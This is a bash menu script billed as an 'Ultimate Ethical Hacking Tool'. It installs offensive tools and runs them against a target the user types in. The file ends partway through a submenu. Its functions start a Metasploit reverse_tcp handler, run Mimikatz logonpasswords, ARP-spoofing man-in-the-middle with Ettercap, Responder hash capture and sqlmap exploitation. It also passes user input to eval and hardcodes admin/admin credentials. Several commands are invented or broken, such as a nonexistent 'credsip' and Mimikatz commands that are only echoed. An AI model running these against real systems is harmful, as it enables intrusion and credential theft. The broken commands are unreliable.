#!/bin/bash

# Ensure the script is run as root
if [ "$(id -u)" -ne 0 ]; then
  echo "Please run as root."
  exit 1
fi

LOG_FILE="/var/log/hacking_tool.log"
OUTPUT_DIR="results"
BURP_SUITE_PATH="/opt/BurpSuite"
ZAP_PATH="/opt/zap"
INSTALL_PATH="/opt/tools"
REPORT_PATH="$OUTPUT_DIR/report"

# Function to display ASCII art and main menu
display_menu() {
  clear
  cat << "EOF"
============================================
                                            
                       $$$$$$\              
                      $$$ __$$\             
   $$$$$$\   $$$$$$\  $$$$\ $$ |$$\   $$\   
  $$  __$$\ $$  __$$\ $$\$$\$$ |\$$\ $$  |  
  $$ /  $$ |$$ |  \__|$$ \$$$$ | \$$$$  /   
  $$ |  $$ |$$ |      $$ |\$$$ | $$  $$<    
  $$$$$$$  |$$ |      \$$$$$$  /$$  /\$$\   
  $$  ____/ \__|       \______/ \__/  \__|  
  $$ |                                      
  $$ |                                      
  \__|                                      
                                            
      Ultimate Ethical Hacking Tool         
============================================
EOF
  echo "============================================"
  echo "     Choose an option from the menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. System Setup and Updates          |"
  echo "               +--------------------------------------+"
  echo "               | 2. Reconnaissance                    |"
  echo "               +--------------------------------------+"
  echo "               | 3. Enumeration                       |"
  echo "               +--------------------------------------+"
  echo "               | 4. Vulnerability Analysis            |"
  echo "               +--------------------------------------+"
  echo "               | 5. Exploitation                      |"
  echo "               +--------------------------------------+"
  echo "               | 6. Post-Exploitation                 |"
  echo "               +--------------------------------------+"
  echo "               | 7. MiTM Attacks                      |"
  echo "               +--------------------------------------+"
  echo "               | 8. Password Hash Capturing           |"
  echo "               +--------------------------------------+"
  echo "               | 9. Reporting                         |"
  echo "               +--------------------------------------+"
  echo "               | 0. Exit                              |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read choice
}

# Logging function
log_and_exec() {
  echo "[*] $1" | tee -a $LOG_FILE
  eval "$2" | tee -a $LOG_FILE
}

# Function to show progress indicator
show_progress() {
  while kill -0 $! 2> /dev/null; do
    for s in / - \\ \|; do
      printf "\r[%c] Working..." "$s"
      sleep 0.1
    done
  done
  printf "\r"
}

# Function to update and upgrade the system
update_system() {
  log_and_exec "Updating and upgrading the system..." "apt update && apt upgrade -y & show_progress"
}

# Function to install all requirements
install_requirements() {
  log_and_exec "Installing general tools..." "apt install -y git curl wget vim & show_progress"
  sleep 2
  log_and_exec "Installing recon tools..." "apt install -y nmap masscan recon-ng amass sublist3r dnsenum whois whatweb dirsearch theharvester assetfinder maltego social-analyzer & show_progress"
  sleep 2
  log_and_exec "Installing theHarvester from GitHub..." "git clone https://github.com/laramies/theHarvester.git /opt/theHarvester && cd /opt/theHarvester && python3 -m pip install -r requirements/base.txt & show_progress"
  sleep 2
  log_and_exec "Installing enumeration tools..." "apt install -y enum4linux smbclient nbtscan ldap-utils snmp snmpwalk dnsrecon dnsenum & show_progress"
  sleep 2
  log_and_exec "Installing exploitation tools..." "apt install -y metasploit-framework sqlmap exploitdb afl mitmproxy ettercap-text-only & show_progress"
  sleep 2
  log_and_exec "Installing post-exploitation tools..." "apt install -y bloodhound mimikatz empire responder & show_progress"
  sleep 2
  log_and_exec "Installing defense tools..." "apt install -y ufw fail2ban & show_progress"
  sleep 2
  log_and_exec "Installing analytics tools..." "wget -O splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz 'https://download.splunk.com/products/splunk/releases/8.2.2/linux/splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz' && tar -xvf splunk-8.2.2-a7f645ddaf91-Linux-x86_64.tgz -C /opt && /opt/splunk/bin/splunk start --accept-license && /opt/splunk/bin/splunk enable boot-start & show_progress"
  sleep 2
  log_and_exec "Installing network analysis tools..." "apt install -y wireshark tcpdump & show_progress"
  sleep 2
  log_and_exec "Installing BurpSuite..." "mkdir -p $BURP_SUITE_PATH && wget -O $BURP_SUITE_PATH/BurpSuite.jar 'https://portswigger.net/burp/releases/download?product=community&version=2021.10.1&type=jar' & show_progress"
  sleep 2
  log_and_exec "Installing ZAP..." "mkdir -p $ZAP_PATH && wget -O $ZAP_PATH/ZAP_2_9_0.zip 'https://github.com/zaproxy/zaproxy/releases/download/v2.9.0/ZAP_2_9_0.zip' && unzip $ZAP_PATH/ZAP_2_9_0.zip -d $ZAP_PATH & show_progress"
  sleep 2
  log_and_exec "Installing password cracking tools..." "apt install -y hashcat john & show_progress"
}

# Reconnaissance Functions
recon_nmap() {
  echo "[*] Enter the target IP or domain for Nmap recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/nmap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Nmap recon for $TARGET..." "
    nmap -sC -sV -oN $OUTPUT_DIR/nmap.txt $TARGET &
    show_progress
  "

  echo "[*] Nmap recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_masscan() {
  echo "[*] Enter the target IP or domain for Masscan recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/masscan/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Masscan recon for $TARGET..." "
    masscan -p1-65535 --rate=1000 -oL $OUTPUT_DIR/masscan.txt $TARGET &
    show_progress
  "

  echo "[*] Masscan recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_amass() {
  echo "[*] Enter the target domain for Amass recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/amass/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Amass recon for $TARGET..." "
    amass enum -d $TARGET -o $OUTPUT_DIR/amass.txt &
    show_progress
  "

  echo "[*] Amass recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_maltego() {
  echo "[*] Enter the target domain for Maltego recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/maltego/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Maltego recon for $TARGET..." "
    maltego $TARGET > $OUTPUT_DIR/maltego.txt &
    show_progress
  "

  echo "[*] Maltego recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_social_analyzer() {
  echo "[*] Enter the target username for Social Analyzer recon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/social_analyzer/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Social Analyzer recon for $TARGET..." "
    social-analyzer -m all -u $TARGET -o $OUTPUT_DIR/social_analyzer.json &
    show_progress
  "

  echo "[*] Social Analyzer recon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_dnsrecon() {
  echo "[*] Enter the target domain for DNSRecon:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/dnsrecon/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSRecon for $TARGET..." "
    dnsrecon -d $TARGET -a -r -s -t std,brt,srv -z -o $OUTPUT_DIR/dnsrecon.xml &
    show_progress
  "

  echo "[*] DNSRecon completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

recon_dnsenum() {
  echo "[*] Enter the target domain for DNSEnum:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/recon/dnsenum/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSEnum for $TARGET..." "
    dnsenum $TARGET -o $OUTPUT_DIR/dnsenum.xml &
    show_progress
  "

  echo "[*] DNSEnum completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Enumeration Functions
enum_enum4linux() {
  echo "[*] Enter the target IP for enum4linux enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/enum4linux/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting enum4linux enumeration for $TARGET..." "
    enum4linux $TARGET > $OUTPUT_DIR/enum4linux.txt &
    show_progress
  "

  echo "[*] enum4linux enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_smbclient() {
  echo "[*] Enter the target IP for smbclient enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/smbclient/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting smbclient enumeration for $TARGET..." "
    smbclient -L $TARGET > $OUTPUT_DIR/smbclient.txt &
    show_progress
  "

  echo "[*] smbclient enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_nbtscan() {
  echo "[*] Enter the target IP for nbtscan enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/nbtscan/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting nbtscan enumeration for $TARGET..." "
    nbtscan $TARGET > $OUTPUT_DIR/nbtscan.txt &
    show_progress
  "

  echo "[*] nbtscan enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_ldapsearch() {
  echo "[*] Enter the target IP for LDAP enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/ldapsearch/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting LDAP enumeration for $TARGET..." "
    ldapsearch -x -h $TARGET -s base -b '' > $OUTPUT_DIR/ldapsearch.txt &
    show_progress
  "

  echo "[*] LDAP enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_snmpwalk() {
  echo "[*] Enter the target IP for SNMP enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/snmpwalk/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting SNMP enumeration for $TARGET..." "
    snmpwalk -c public -v1 $TARGET > $OUTPUT_DIR/snmpwalk.txt &
    show_progress
  "

  echo "[*] SNMP enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_dnsrecon() {
  echo "[*] Enter the target domain for DNSRecon enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/dnsrecon/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSRecon enumeration for $TARGET..." "
    dnsrecon -d $TARGET -a -r -s -t std,brt,srv -z -o $OUTPUT_DIR/dnsrecon.xml &
    show_progress
  "

  echo "[*] DNSRecon enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

enum_dnsenum() {
  echo "[*] Enter the target domain for DNSEnum enumeration:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/enum/dnsenum/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting DNSEnum enumeration for $TARGET..." "
    dnsenum $TARGET -o $OUTPUT_DIR/dnsenum.xml &
    show_progress
  "

  echo "[*] DNSEnum enumeration completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Vulnerability Analysis Functions
vuln_nikto() {
  echo "[*] Enter the target URL for Nikto vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/nikto/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Nikto vulnerability analysis for $TARGET..." "
    nikto -h $TARGET -output $OUTPUT_DIR/nikto.txt &
    show_progress
  "

  echo "[*] Nikto vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_zap() {
  echo "[*] Enter the target URL for ZAP vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/zap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting ZAP vulnerability analysis for $TARGET..." "
    $ZAP_PATH/zap.sh -cmd -quickurl $TARGET -quickout $OUTPUT_DIR/zap.html &
    show_progress
  "

  echo "[*] ZAP vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_sqlmap() {
  echo "[*] Enter the target URL for SQLMap vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/sqlmap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting SQLMap vulnerability analysis for $TARGET..." "
    sqlmap -u 'http://$TARGET' --batch --output-dir=$OUTPUT_DIR &
    show_progress
  "

  echo "[*] SQLMap vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_openvas() {
  echo "[*] Enter the target IP or domain for OpenVAS vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/openvas/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting OpenVAS vulnerability analysis for $TARGET..." "
    gvm-start && gvm-cli tls --gmp-username admin --gmp-password admin socket --xml '<create_target><name>$TARGET</name><hosts>$TARGET</hosts></create_target>' > $OUTPUT_DIR/openvas.xml &
    show_progress
  "

  echo "[*] OpenVAS vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

vuln_nessus() {
  echo "[*] Enter the target IP or domain for Nessus vulnerability analysis:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/vuln/nessus/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Nessus vulnerability analysis for $TARGET..." "
    /opt/nessus/sbin/nessuscli update --register XXXX-XXXX-XXXX-XXXX --plugins-only && /opt/nessus/sbin/nessusd -D && nessus scan list -f json | jq '.[] | select(.status == \"completed\")' > $OUTPUT_DIR/nessus.json &
    show_progress
  "

  echo "[*] Nessus vulnerability analysis completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Exploitation Functions
exploit_msfconsole() {
  echo "[*] Enter the target IP for Metasploit exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/msfconsole/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Metasploit exploitation for $TARGET..." "
    msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit' &
    show_progress
  "

  echo "[*] Metasploit exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_sqlmap() {
  echo "[*] Enter the target URL for SQLMap exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/sqlmap/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting SQLMap exploitation for $TARGET..." "
    sqlmap -u 'http://$TARGET' --batch --output-dir=$OUTPUT_DIR &
    show_progress
  "

  echo "[*] SQLMap exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_burpsuite() {
  echo "[*] Enter the target URL for BurpSuite exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/burpsuite/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting BurpSuite exploitation for $TARGET..." "
    java -jar $BURP_SUITE_PATH/BurpSuite.jar -h $TARGET -o $OUTPUT_DIR/burpsuite.html &
    show_progress
  "

  echo "[*] BurpSuite exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_exploitdb() {
  echo "[*] Enter the search term for ExploitDB:" | tee -a $LOG_FILE
  read SEARCH_TERM
  OUTPUT_DIR="$OUTPUT_DIR/exploit/exploitdb/$SEARCH_TERM"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Searching ExploitDB for $SEARCH_TERM..." "
    searchsploit $SEARCH_TERM > $OUTPUT_DIR/exploitdb.txt &
    show_progress
  "

  echo "[*] ExploitDB search completed for $SEARCH_TERM. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

exploit_fuzzing() {
  echo "[*] Enter the target application for fuzzing:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/exploit/fuzzing/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting fuzzing for $TARGET..." "
    afl-fuzz -i $TARGET -o $OUTPUT_DIR/fuzzing &
    show_progress
  "

  echo "[*] Fuzzing completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Post-Exploitation Functions
post_exploit_bloodhound() {
  echo "[*] Enter the target domain for Bloodhound post-exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/post-exploit/bloodhound/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Bloodhound post-exploitation for $TARGET..." "
    bloodhound-python -c All -d $TARGET -u username -p password -ns $TARGET -d $OUTPUT_DIR/bloodhound &
    show_progress
  "

  echo "[*] Bloodhound post-exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

post_exploit_mimikatz() {
  echo "[*] Enter the target IP for Mimikatz post-exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/post-exploit/mimikatz/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Mimikatz post-exploitation for $TARGET..." "
    echo 'privilege::debug' &&
    echo 'sekurlsa::logonpasswords' &&
    echo 'exit' > $OUTPUT_DIR/mimikatz.txt &
    show_progress
  "

  echo "[*] Mimikatz post-exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

post_exploit_empire() {
  echo "[*] Enter the target IP for Empire post-exploitation:" | tee -a $LOG_FILE
  read TARGET
  OUTPUT_DIR="$OUTPUT_DIR/post-exploit/empire/$TARGET"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Empire post-exploitation for $TARGET..." "
    empire -empire &
    show_progress
  "

  echo "[*] Empire post-exploitation completed for $TARGET. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# MiTM Attack Functions
mitm_ettercap() {
  echo "[*] Enter the network interface for Ettercap MiTM attack:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/mitm/ettercap"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Ettercap MiTM attack on interface $INTERFACE..." "
    ettercap -T -i $INTERFACE -M arp:remote // // -w $OUTPUT_DIR/ettercap.pcap &
    show_progress
  "

  echo "[*] Ettercap MiTM attack completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

mitm_mitmproxy() {
  echo "[*] Enter the port for mitmproxy (default 8080):" | tee -a $LOG_FILE
  read PORT
  OUTPUT_DIR="$OUTPUT_DIR/mitm/mitmproxy"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting mitmproxy on port $PORT..." "
    mitmproxy -p $PORT -w $OUTPUT_DIR/mitmproxy.log &
    show_progress
  "

  echo "[*] mitmproxy MiTM attack completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

mitm_responder() {
  echo "[*] Enter the network interface for Responder:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/mitm/responder"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Responder on interface $INTERFACE..." "
    responder -I $INTERFACE -w $OUTPUT_DIR/responder.log &
    show_progress
  "

  echo "[*] Responder MiTM attack completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Password Hash Capturing Functions
hash_capture_responder() {
  echo "[*] Enter the network interface for Responder hash capturing:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/hash_capture/responder"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Responder for hash capturing on interface $INTERFACE..." "
    responder -I $INTERFACE -wrf -v > $OUTPUT_DIR/responder_hashes.txt &
    show_progress
  "

  echo "[*] Responder hash capturing completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

hash_capture_ettercap() {
  echo "[*] Enter the network interface for Ettercap hash capturing:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/hash_capture/ettercap"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting Ettercap for hash capturing on interface $INTERFACE..." "
    ettercap -T -i $INTERFACE -M arp:remote // // -L $OUTPUT_DIR/ettercap_hashes &
    show_progress
  "

  echo "[*] Ettercap hash capturing completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

hash_capture_creds() {
  echo "[*] Enter the network interface for capturing credentials with CredSniper:" | tee -a $LOG_FILE
  read INTERFACE
  OUTPUT_DIR="$OUTPUT_DIR/hash_capture/credsniper"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Starting CredSniper for capturing credentials on interface $INTERFACE..." "
    credsip -i $INTERFACE -o $OUTPUT_DIR/credsniper_results &
    show_progress
  "

  echo "[*] CredSniper credentials capturing completed. Results saved in $OUTPUT_DIR." | tee -a $LOG_FILE
}

# Reporting Function
generate_report() {
  echo "[*] Generating final report..." | tee -a $LOG_FILE
  OUTPUT_DIR="$REPORT_PATH"
  mkdir -p $OUTPUT_DIR

  log_and_exec "Generating report..." "
    echo 'Recon Results' > $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/recon/* >> $OUTPUT_DIR/report.txt &&
    echo 'Enumeration Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/enum/* >> $OUTPUT_DIR/report.txt &&
    echo 'Vulnerability Analysis Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/vuln/* >> $OUTPUT_DIR/report.txt &&
    echo 'Exploitation Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/exploit/* >> $OUTPUT_DIR/report.txt &&
    echo 'Post-Exploitation Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/post-exploit/* >> $OUTPUT_DIR/report.txt &&
    echo 'MiTM Attack Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/mitm/* >> $OUTPUT_DIR/report.txt &&
    echo 'Hash Capturing Results' >> $OUTPUT_DIR/report.txt &&
    cat $OUTPUT_DIR/hash_capture/* >> $OUTPUT_DIR/report.txt
  "

  echo "[*] Report generated. Saved in $OUTPUT_DIR/report.txt." | tee -a $LOG_FILE
}

# Function to handle user choice
handle_choice() {
  case $1 in
    1) update_system && install_requirements ;;
    2) recon_menu 
      handle_recon_choice $recon_choice 
      ;;
    3) 
      enum_menu 
      handle_enum_choice $enum_choice 
      ;;
    4) 
      vuln_menu 
      handle_vuln_choice $vuln_choice 
      ;;
    5) 
      exploit_menu 
      handle_exploit_choice $exploit_choice 
      ;;
    6) 
      post_exploit_menu 
      handle_post_exploit_choice $post_exploit_choice 
      ;;
    7) 
      mitm_menu 
      handle_mitm_choice $mitm_choice 
      ;;
    8) 
      hash_capture_menu 
      handle_hash_capture_choice $hash_capture_choice 
      ;;
    9) generate_report ;;
    0) echo "Exiting..."; exit 0 ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

# Sub-menu Functions
recon_menu() {
  clear
  echo "============================================"
  echo "        Reconnaissance Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Nmap Recon                        |"
  echo "               +--------------------------------------+"
  echo "               | 2. Masscan Recon                     |"
  echo "               +--------------------------------------+"
  echo "               | 3. Amass Recon                       |"
  echo "               +--------------------------------------+"
  echo "               | 4. Maltego Recon                     |"
  echo "               +--------------------------------------+"
  echo "               | 5. Social Analyzer Recon             |"
  echo "               +--------------------------------------+"
  echo "               | 6. DNSRecon                          |"
  echo "               +--------------------------------------+"
  echo "               | 7. DNSEnum                           |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read recon_choice
}

handle_recon_choice() {
  case $1 in
    1) recon_nmap ;;
    2) recon_masscan ;;
    3) recon_amass ;;
    4) recon_maltego ;;
    5) recon_social_analyzer ;;
    6) recon_dnsrecon ;;
    7) recon_dnsenum ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

enum_menu() {
  clear
  echo "============================================"
  echo "        Enumeration Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Enum4Linux Enumeration            |"
  echo "               +--------------------------------------+"
  echo "               | 2. SMBClient Enumeration             |"
  echo "               +--------------------------------------+"
  echo "               | 3. NBScan Enumeration                |"
  echo "               +--------------------------------------+"
  echo "               | 4. LDAP Enumeration                  |"
  echo "               +--------------------------------------+"
  echo "               | 5. SNMP Enumeration                  |"
  echo "               +--------------------------------------+"
  echo "               | 6. DNSRecon Enumeration              |"
  echo "               +--------------------------------------+"
  echo "               | 7. DNSEnum Enumeration               |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read enum_choice
}

handle_enum_choice() {
  case $1 in
    1) enum_enum4linux ;;
    2) enum_smbclient ;;
    3) enum_nbtscan ;;
    4) enum_ldapsearch ;;
    5) enum_snmpwalk ;;
    6) enum_dnsrecon ;;
    7) enum_dnsenum ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

vuln_menu() {
  clear
  echo "============================================"
  echo "        Vulnerability Analysis Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Nikto Vulnerability Analysis      |"
  echo "               +--------------------------------------+"
  echo "               | 2. ZAP Vulnerability Analysis        |"
  echo "               +--------------------------------------+"
  echo "               | 3. SQLMap Vulnerability Analysis     |"
  echo "               +--------------------------------------+"
  echo "               | 4. OpenVAS Vulnerability Analysis    |"
  echo "               +--------------------------------------+"
  echo "               | 5. Nessus Vulnerability Analysis     |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read vuln_choice
}

handle_vuln_choice() {
  case $1 in
    1) vuln_nikto ;;
    2) vuln_zap ;;
    3) vuln_sqlmap ;;
    4) vuln_openvas ;;
    5) vuln_nessus ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

exploit_menu() {
  clear
  echo "============================================"
  echo "        Exploitation Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Metasploit Exploitation           |"
  echo "               +--------------------------------------+"
  echo "               | 2. SQLMap Exploitation               |"
  echo "               +--------------------------------------+"
  echo "               | 3. BurpSuite Exploitation            |"
  echo "               +--------------------------------------+"
  echo "               | 4. ExploitDB Search                  |"
  echo "               +--------------------------------------+"
  echo "               | 5. Fuzzing                           |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read exploit_choice
}

handle_exploit_choice() {
  case $1 in
    1) exploit_msfconsole ;;
    2) exploit_sqlmap ;;
    3) exploit_burpsuite ;;
    4) exploit_exploitdb ;;
    5) exploit_fuzzing ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

post_exploit_menu() {
  clear
  echo "============================================"
  echo "        Post-Exploitation Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Bloodhound Post-Exploitation      |"
  echo "               +--------------------------------------+"
  echo "               | 2. Mimikatz Post-Exploitation        |"
  echo "               +--------------------------------------+"
  echo "               | 3. Empire Post-Exploitation          |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read post_exploit_choice
}

handle_post_exploit_choice() {
  case $1 in
    1) post_exploit_bloodhound ;;
    2) post_exploit_mimikatz ;;
    3) post_exploit_empire ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

mitm_menu() {
  clear
  echo "============================================"
  echo "        MiTM Attack Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Ettercap MiTM Attack              |"
  echo "               +--------------------------------------+"
  echo "               | 2. mitmproxy MiTM Attack             |"
  echo "               +--------------------------------------+"
  echo "               | 3. Responder MiTM Attack             |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
  echo -n "Choose an option: "
  read mitm_choice
}

handle_mitm_choice() {
  case $1 in
    1) mitm_ettercap ;;
    2) mitm_mitmproxy ;;
    3) mitm_responder ;;
    0) display_menu ;;
    *) echo "Invalid option. Please try again." ;;
  esac
}

hash_capture_menu() {
  clear
  echo "============================================"
  echo "        Password Hash Capturing Menu:"
  echo "============================================"
  echo "               +--------------------------------------+"
  echo "               | 1. Responder Hash Capturing          |"
  echo "               +--------------------------------------+"
  echo "               | 2. Ettercap Hash Capturing           |"
  echo "               +--------------------------------------+"
  echo "               | 3. CredSniper Hash Capturing         |"
  echo "               +--------------------------------------+"
  echo "               | 0. Back to Main Menu                 |"
  echo "               +--------------------------------------+"
  echo
